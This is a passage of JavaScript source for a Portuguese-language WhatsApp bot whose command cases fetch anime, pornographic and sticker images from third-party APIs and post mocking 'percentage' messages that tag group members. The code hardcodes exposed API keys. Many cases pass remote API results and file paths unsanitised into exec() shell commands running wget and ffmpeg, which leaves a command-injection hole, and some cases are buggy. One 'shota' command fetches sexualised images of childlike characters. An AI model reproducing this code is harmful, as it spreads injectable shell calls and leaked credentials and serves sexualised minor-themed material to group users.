loli.sendMessage(from, buttonMessagiss28, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break  
                            case 'elfa':
                          addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				             gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`http://api.lolhuman.xyz/api/random/elf?apikey=ChOkYbOT8`, {method: 'get'})
                             mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss100 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss100, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                            break
				case 'beijarindefinido':
				addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                if (!isAnime) return reply(' *Deve ativar o modo Anime* ')
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buffer, sticker, {quoted: say1, thumbnail:null})
						fs.unlinkSync(rano)
					})
					   
					break
					
					case 'figu':
					case 'f':
					case 'sticker':
                                        case 's':
					case 'fig':
					framerate = 12
					if(args[0] > 15) return reply('o limite são apenas 15 fps')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length < 2) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await loli.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.jpeg')
						reply(mess.wait)
						exec(`ffmpeg -i ${media} -y -vcodec libwebp -filter_complex "[0:v] scale=512:512,fps=15,pad=512:512:-1:-1:color=white@0.0,split[a][b];[a]palettegen=reserve_transparent=on:transparency_color=ffffff[p];[b][p]paletteuse" -f webp ${ran}`, function(err, res){
							exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${ran} -o ${ran}`, async (error) => {
							loli.sendMessage(from, fs.readFileSync(ran), sticker, {quoted:mek})
						})
						})
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length < 2) {
						if(args.length < 1){framerate = 12}
						else{framerate = args[0]}
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await loli.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.mp4')
						reply(mess.wait)
						exec(`ffmpeg -i ${media} -y -vcodec libwebp -filter_complex "[0:v] scale=512:512,fps=${framerate},pad=512:512:-1:-1:color=white@0.0,split[a][b];[a]palettegen=reserve_transparent=on:transparency_color=ffffff[p];[b][p]paletteuse" -f webp ${ran}`, function(err, res){
							   exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${ran} -o ${ran}`, async (error) => {
							if(err) return reply('Deu erro, tente novamente :/')
							loli.sendMessage(from, fs.readFileSync(ran), sticker, {quoted:mek})
							loli.sendMessage(from, `caso a sticker fique parada use ${prefix}st novamente, para fazer a sticker`, text, {quoted:say1})
							setTimeout( async function(){
								fs.unlinkSync(ran)
								fs.unlinkSync(media)
							}, 5000)
						})
						})
					} else return reply(`Marque a imagem com o comando ${prefix}figu ou coloque na legenda, o video ou gif so pode ter 10 segundos de duração, caso queira coloque apenas o numero de fps`)
				break
					case 'waifu':
					  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`http://api.lolhuman.xyz/api/random/waifu?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss29 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss29, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
			    case 'indefinido234':
			          addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
			 
					reply(mess.wait)
                    res = await fetchJson(`https://waifu.pics/api/nsfw/waifu`)
                    ggf = await getBuffer(res.url)
                    loli.sendMessage(from, ggf, image, {quoted: mek, thumbnail:null})
					break
					case 'sn':
					addFilter(from)
                    if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
		             buffer = await getBuffer(`https://i.imgur.com/Kb8XFEY.jpg`)
                     const sn = ['sim', 'não']
                     gosto = body.slice(3)
                     if (args.length < 1) return loli.sendMessage(from, `Você deve fazer uma pergunta...\nExemplo: ${prefix}sn O Zadik é um Carioca?`, text, {quoted: mek})
                     const jawab = sn[Math.floor(Math.random() * (sn.length))]
                     loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: `${gosto}\n\nSegundo meus cálculos, eu acredito que... ${jawab}`})
                     break
                      case 'morte':
		             case 'death':
		addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
		             buffer = await getBuffer(`https://i.imgur.com/K7QuxGS.jpg`)
		             idde1 = ["30","76","90","72","83","73","83","74","92","100","94","48","37","53","63"]
                     idade2 = idde1[Math.floor(Math.random() * (idde1.length))]
			         loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: `Pessoas com este nome: ${pushname} \nTendem a morrer aos ${idade2} anos de idade.`})
			         break
case 'rankotakus':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
buffer = await getBuffer(`https://i.imgur.com/3HLt7ed.png`)
reply(mess.wait)
membr = []
const otaku1 = groupMembers
const otaku2 = groupMembers
const otaku3 = groupMembers
const otaku4 = groupMembers
const otaku5 = groupMembers
const otaku6 = groupMembers
const otaku7 = groupMembers
const otaku = groupMembers
const otaku9 = groupMembers
const otaku10 = groupMembers
const otakus1 = otaku1[Math.floor(Math.random() * otaku1.length)]
const otakus2 = otaku2[Math.floor(Math.random() * otaku2.length)]
const otakus3 = otaku3[Math.floor(Math.random() * otaku3.length)]
const otakus4 = otaku4[Math.floor(Math.random() * otaku4.length)]
const otakus5 = otaku5[Math.floor(Math.random() * otaku5.length)]
const otakus6 = otaku6[Math.floor(Math.random() * otaku6.length)]
const otakus7 = otaku7[Math.floor(Math.random() * otaku7.length)]
const otakus = otaku[Math.floor(Math.random() * otaku.length)]
const otakus9 = otaku9[Math.floor(Math.random() * otaku9.length)]
const otakus10 = otaku10[Math.floor(Math.random() * otaku10.length)]
const otk1 = `esses são os otakus fedidos do grupo\n@${otakus1.jid.split('@')[0]}\n@${otakus2.jid.split('@')[0]}\n@${otakus3.jid.split('@')[0]}\n@${otakus4.jid.split('@')[0]}\n@${otakus5.jid.split('@')[0]}\n@${otakus6.jid.split('@')[0]}\n@${otakus7.jid.split('@')[0]}\n@${otakus.jid.split('@')[0]}\n@${otakus9.jid.split('@')[0]}\n@${otakus10.jid.split('@')[0]}\n\n💎♡Høřı. B. O. T♡💎`
membr.push(otakus1.jid)
membr.push(otakus2.jid)
membr.push(otakus3.jid)
membr.push(otakus4.jid)
membr.push(otakus5.jid)
membr.push(otakus6.jid)
membr.push(otakus7.jid)
membr.push(otakus.jid)
membr.push(otakus9.jid)
membr.push(otakus10.jid)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: `${otk1}`, humbnail:null})
break
             case 'burro':
                             addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
			                       if (args.length < 1) return reply('marque seus amigos!')
                             	try {
						buff = await getBuffer('https://i.imgur.com/BJGEIWi.jpg')
						r = Math.floor(Math.random() * 100 + 0)
						if(args.length < 1) {
							if(isGroup) { num1 = mek.participant.slice(0, -15)+'@s.whatsapp.net'}
							else{ num1 = mek.key.remoteJid.slice(0, -15)+'@s.whatsapp.net'}
						}
						else { num1 = args[0] 
							if(!isNaN(num1.slice(1)))
							{
								if(num1.startsWith('@')) {num1 = num1.slice(1)+'@s.whatsapp.net'}
							}
						}
						if(num1.slice(0, -15) == '') { num1 = num1+'@s.whatsapp.net'}
						loli.sendMessage(from, `*Aguarde onii-chan @${num1.slice(0, -15)}, pegando...🖤*`, extendedText, {quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						setTimeout(async function () {
							if(r == 0) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e burro CARA @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 0 && r <= 33) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e burro CARA @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 33 && r <= 40) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e burro CARA @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 40 && r <= 66) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e burro CARA @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 66 && r <= 100) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e burro CARA @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						}, 3000)
						} catch {
							reply('Deu erro')
						}
						break
						case 'supera':
						addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
			                       if (args.length < 1) return reply('marque seus amigos!')
                             	try {
						buff = await getBuffer('https://i.imgur.com/ISfDY9T.jpg')
						r = Math.floor(Math.random() * 100 + 0)
						if(args.length < 1) {
							if(isGroup) { num1 = mek.participant.slice(0, -15)+'@s.whatsapp.net'}
							else{ num1 = mek.key.remoteJid.slice(0, -15)+'@s.whatsapp.net'}
						}
						else { num1 = args[0] 
							if(!isNaN(num1.slice(1)))
							{
								if(num1.startsWith('@')) {num1 = num1.slice(1)+'@s.whatsapp.net'}
							}
						}
						if(num1.slice(0, -15) == '') { num1 = num1+'@s.whatsapp.net'}
						loli.sendMessage(from, `*Aguarde onii-chan @${num1.slice(0, -15)}, pegando...🖤*`, extendedText, {quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						setTimeout(async function () {
							if(r == 0) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e Fraco @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 0 && r <= 33) return loli.sendMessage(from, buff, image, {caption: `você tem que aprender a Superar @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 33 && r <= 40) return loli.sendMessage(from, buff, image, {caption: `lhe falta superar @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 40 && r <= 66) return loli.sendMessage(from, buff, image, {caption: `i ala ta pagando de superado. SUPERA @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 66 && r <= 100) return loli.sendMessage(from, buff, image, {caption: `Olha como ele e Superadinho @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						}, 3000)
						} catch {
							reply('Deu erro')
						}
						break
						case 'forte':
						addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
			                       if (args.length < 1) return reply('marque seus amigos!')
                             	try {
						buff = await getBuffer('https://i.imgur.com/vilBAWf.jpg`')
						r = Math.floor(Math.random() * 100 + 0)
						if(args.length < 1) {
							if(isGroup) { num1 = mek.participant.slice(0, -15)+'@s.whatsapp.net'}
							else{ num1 = mek.key.remoteJid.slice(0, -15)+'@s.whatsapp.net'}
						}
						else { num1 = args[0] 
							if(!isNaN(num1.slice(1)))
							{
								if(num1.startsWith('@')) {num1 = num1.slice(1)+'@s.whatsapp.net'}
							}
						}
						if(num1.slice(0, -15) == '') { num1 = num1+'@s.whatsapp.net'}
						loli.sendMessage(from, `*Aguarde onii-chan @${num1.slice(0, -15)}, pegando...🖤*`, extendedText, {quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						setTimeout(async function () {
							if(r == 0) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e FORTE@${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 0 && r <= 33) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e FORTE @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 33 && r <= 40) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e FORTE @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 40 && r <= 66) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e FORTE @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 66 && r <= 100) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê e FORTE @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						}, 3000)
						} catch {
							reply('Deu erro')
						}
						break
		                 case 'inteligência':
		                 case 'inteligencia':
		addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
		if (args.length < 1) return reply('marque seus amigos!')
		  	try {
						buff = await getBuffer('https://i.imgur.com/UGo5On2.jpg`')
						r = Math.floor(Math.random() * 100 + 0)
						if(args.length < 1) {
							if(isGroup) { num1 = mek.participant.slice(0, -15)+'@s.whatsapp.net'}
							else{ num1 = mek.key.remoteJid.slice(0, -15)+'@s.whatsapp.net'}
						}
						else { num1 = args[0] 
							if(!isNaN(num1.slice(1)))
							{
								if(num1.startsWith('@')) {num1 = num1.slice(1)+'@s.whatsapp.net'}
							}
						}
						if(num1.slice(0, -15) == '') { num1 = num1+'@s.whatsapp.net'}
						loli.sendMessage(from, `*Aguarde onii-chan @${num1.slice(0, -15)}, pegando...🖤*`, extendedText, {quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						setTimeout(async function () {
							if(r == 0) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê é inteligênte SENPAI @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 0 && r <= 33) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê é inteligênte SENPAI @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 33 && r <= 40) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê é inteligênte SENPAI @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`,quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 40 && r <= 66) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê é inteligênte SENPAI @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
							if(r > 66 && r <= 100) return loli.sendMessage(from, buff, image, {caption: `Mas como voçê é inteligênte SENPAI @${num1.slice(0, -15)} olha só sua porcentagem:* ${r}%`, quoted: mek, thumbnail:null, contextInfo: { mentionedJid: [num1]}})
						}, 3000)
						} catch {
							reply('Deu erro')
						}
		               break
                    case 'neko2':
					  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/neko?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss30 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss30, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                              
					break
                    case 'neko':
	                addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				            gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`http://api.lolhuman.xyz/api/random/neko?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss31 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss31, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                              
                            break
                            case 'blowgif':
					  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
					break
					case 'blowgif2':
					     addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buff, sticker, {quoted: horistk })
						fs.unlinkSync(rano)
					})
					break
                     case 'hentaifig2':
                  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buff, sticker, {quoted: horiNome })
						fs.unlinkSync(rano)
					})
					break
				case 'beijar2':
				addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/kiss?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    }) 
					break 
				case 'shota':
				addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
					cry = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomshota?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
                   if (!isGroup) return reply(mess.only.group)
					reply (mess.wait)
					exec(`wget ${anu.result} -O ${cry} && ffmpeg -i ${cry} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
					       exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${ranp} -o ${ranp}`, async (error) => {
					     	if(err) return reply('Deu erro, tente novamente :/')
						fs.unlinkSync(cry)
						buffer = fs.readFileSync(rano)
						loli.sendMessage(from, buff, sticker, {quoted: horistk })
						fs.unlinkSync(rano)
					})
	})
					break 
					case 'hentaifig':
				 addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
	            ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/random_hentai_gif?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
             exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
case 'kannafig':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length == 0) return reply(`Exemplo: ${prefix + command} hori melhor bot`)
reply(mess.wait)
lod = await fetchJson(`https://nekobot.xyz/api/imagegen?type=kannagen&text=${q}`)
sendStickerFromUrl(from, lod.message, reply.success)
break 


case 'bonk':
				 addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
				     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random/bonk?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
             exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
case 'anal':
				 addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
				     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/anal?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
             exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
case 'gasm':
				 addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
				     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/gasm?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
             exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break    
case 'blowjob':
				 addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                     reply(mess.wait)
				     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `https://api.lolhuman.xyz/api/random2/bj?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
             exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break 
                 case 'corar':
  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
					     ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/random2/baka?apikey=ChOkYbOT8`
                    exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', '⭐ Henplay ⭐')} ${rano} -o ${rano}`, async (error) => {
						if(err) return reply('Deu erro, tente novamente :/')
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        loli.sendMessage(from, buff, sticker, {quoted: say1 })
                        fs.unlinkSync(rano)
                    })
                    })
                    break
case 'piscar':
  addFilter(from)
                     if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                     reply(mess.wait)
